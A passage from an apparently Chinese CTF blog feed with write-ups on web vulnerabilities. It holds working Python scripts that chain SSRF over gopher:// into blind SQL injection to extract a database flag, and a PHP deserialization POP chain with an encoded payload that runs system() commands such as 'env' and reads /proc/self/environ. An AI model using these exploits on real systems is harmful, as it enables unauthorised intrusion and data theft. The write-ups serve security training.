class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">126</span>):<br>    content = <span class="hljs-string">&quot;id=1 and (length(database())=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>    content_length = <span class="hljs-built_in">len</span>(content)<br>    data = \<span class="hljs-comment">#切记切记下面字符串每行左边要贴边，不然tab会被编码</span><br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    result = urllib.parse.quote(data)<br>    result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>    payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<span class="hljs-comment">#用python直接传参只需要编码一次</span><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>    <span class="hljs-comment">#print(r)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<span class="hljs-comment">#如果sql返回为真，页面会显示&quot;meow meow~&quot;</span><br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#3</span><br></code></pre></td></tr></table></figure><p>输出3，得出数据库长度为3。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>database = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#判断数据库名第i个字符的ascii码是否为j，是的话为真会返回&quot;meow&quot;</span><br>        content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>        content_length = <span class="hljs-built_in">len</span>(content)<br>        data = \<br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>        result = urllib.parse.quote(data)<br>        result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>        payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<br>        r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>        <span class="hljs-comment">#print(r)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<br>            database += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(database)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#r</span><br><span class="hljs-comment">#ru</span><br><span class="hljs-comment">#rua</span><br><span class="hljs-comment">#数据库名为rua</span><br></code></pre></td></tr></table></figure><p>同样，爆表名，因为可能存在多个表，所以使用<code>group_concat()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#flag,</span><br><span class="hljs-comment">#flag,m</span><br><span class="hljs-comment">#flag,me</span><br><span class="hljs-comment">#flag,mes</span><br><span class="hljs-comment">#flag,mess</span><br><span class="hljs-comment">#flag,messa</span><br><span class="hljs-comment">#flag,messag</span><br><span class="hljs-comment">#flag,message</span><br><span class="hljs-comment">#flag,messages</span><br></code></pre></td></tr></table></figure><p>盲猜flag在flag表里，爆字段名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆字段名</span><br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br></code></pre></td></tr></table></figure><p>已知信息：</p><p>数据库rua、表flag、字段flag，爆flag内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆flag表内容</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230412103314980.png"></p><p>拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuck</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1290</span>):<br>        head=<span class="hljs-number">32</span><br>        tail=<span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> head&lt;tail:<br>            mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            <span class="hljs-built_in">id</span> = urllib.parse.quote(sqli)<br>            id_length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)+<span class="hljs-number">3</span><br>            payload = <span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;id_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            tmp = urllib.parse.quote(payload)<br>            new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>            res = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new<br>            dataa = &#123;<br>                <span class="hljs-string">&quot;url&quot;</span>:res<br>            &#125;<br>            r = requests.post(url=url,data=dataa)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow meow meow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                head=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                tail=mid<br>        <span class="hljs-keyword">if</span> head !=<span class="hljs-number">32</span>:<br>            result+=<span class="hljs-built_in">chr</span>(head)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span>   <br>        <span class="hljs-built_in">print</span>(result)<br>fuck()<br></code></pre></td></tr></table></figure><p>当然，看到尝试传入递增变化的数据，bp爆破有时候也不失为一种方法（会用工具真的很重要（哭</p><p>（感谢LinTu提供的思路）</p><p><img src="/2023/02/09/SQLI/image-20230412130046708.png"></p><p>浏览器发送一次请求，bp抓包。记住python出payload的时候要url编码两次，传到Intruder。</p><p><img src="/2023/02/09/SQLI/image-20230412130722783.png"></p><p><img src="/2023/02/09/SQLI/image-20230412130832052.png"></p><p><img src="/2023/02/09/SQLI/image-20230412130852364.png"></p><p>Intruder集束炸弹走起，两个爆破点一个是需判断字符的位置(从1开始)，一个是比较的ascii码(从32到126)。开始爆破</p><p><img src="/2023/02/09/SQLI/image-20230412130941926.png"></p><p>异样流量数据包对应Payload2按照Payload1顺序编码成字符，就是对应的flag了，因为bp是多线程，所以也不会很慢。也算提供了一种新思路吧。</p>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/2023/02/09/XSS/"/>
    <url>/2023/02/09/XSS/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化</title>
    <link href="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="2023-HZNUCTF-ppppop"><a href="#2023-HZNUCTF-ppppop" class="headerlink" title="2023 HZNUCTF ppppop"></a>2023 HZNUCTF ppppop</h2><p>打开页面发现什么也没有，hackbar查看Cookie发现存在Cookie</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Cookie=Tz<span class="hljs-meta">o0</span>OiJ<span class="hljs-attr">Vc2</span>VyIjoxO<span class="hljs-symbol">ntzOjc6</span>ImlzQWRtaW<span class="hljs-number">4</span>i<span class="hljs-meta">O2</span>I<span class="hljs-number">6</span>MDt<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p>base64解码后得到一串序列化数据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;isAdmin&quot;</span>;b:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure><p>b的值为0，尝试将b改为1伪造admin用户登录，进入网页，显示网页源码高亮：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;utils.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkUser</span>()) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]));<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$payload</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>php反序列化，审计本题就是想通过类A来调用某个类的某个方法。</p><p>编写poc验证漏洞:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$a</span>-&gt;className = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span>-&gt;funcName = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;args = <span class="hljs-string">&quot;calc.exe&quot;</span>;<br><br><span class="hljs-variable">$test</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230404125943007.png"></p><p>执行calc.exe，说明存在漏洞。更改$a-&gt;args的值，发现flag存在于环境变量中：</p><p>$a-&gt;args &#x3D; “env”;</p><p>(Linux的环境变量也可以通过查看根目录下文件&#x2F;proc&#x2F;self&#x2F;environ：$a-&gt;args &#x3D; “cat &#x2F;proc&#x2F;self&#x2F;environ”)</p><p>POST传入</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload=fTsid<span class="hljs-name">m5</span>lIjozO<span class="hljs-symbol">nM7</span>I<span class="hljs-symbol">nNncmEiOjQ6</span>czsibWV<span class="hljs-number">0</span>c<span class="hljs-number">3</span>lzIj<span class="hljs-meta">o2</span>O<span class="hljs-symbol">nM7</span>ImVtYU<span class="hljs-number">5</span>jb<span class="hljs-symbol">nVmIjo4</span>O<span class="hljs-symbol">nN9</span>ezowOiJCIjoxOk<span class="hljs-number">87</span>ImVtYU<span class="hljs-number">5</span>zc<span class="hljs-number">2</span>FsYyI<span class="hljs-number">6</span>OTpzezozOiJBIjoxOk<span class="hljs-number">8</span>=<br></code></pre></td></tr></table></figure><p>本题顺便复习了下___call()以及___destruct()魔术方法的使用方法：</p><h3 id="call"><a href="#call" class="headerlink" title="__call():"></a>__call():</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-variable">$method</span>,<span class="hljs-variable">$arg_array</span>);<span class="hljs-comment">//调用一个未定义的方法的时候调用。当调用当前对象不存在的方法时，转向__call()</span><br></code></pre></td></tr></table></figure><p>也就是说，如果test()方法未定义，那么testzhege方法就会作为___call()的第一个参数传入，而test的参数会被装进数组中作为___call()的第二个参数传入。所以当调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$foo</span>-&gt;<span class="hljs-title function_ invoke__">test</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-number">3.4</span>,<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>时，实际是相当于调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$foo</span>-&gt;<span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-number">3.4</span>,<span class="hljs-literal">true</span>));<br></code></pre></td></tr></table></figure><p>本题中B类中$funcName未定义，那么在A类中调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br></code></pre></td></tr></table></figure><p>时，A::$funcName就会被传入B类__call()中的$func，A::$args传入B类的$arg，而$arg[0]就是字符串”calc.exe”。</p><p>在B中转向执行__call()也就是B::$func(B::arg[0]);也就是system(“calc.exe”);</p><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct():"></a>__destruct():</h3><p>类的析构函数，在销毁一个类之前执行一些操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#声明格式：</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">//TODO</span><br>&#125;<br><span class="hljs-comment">#注意：析构函数不能带有任何参数</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#举例演示：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span><br><span class="hljs-class"></span>&#123;<br>    <span 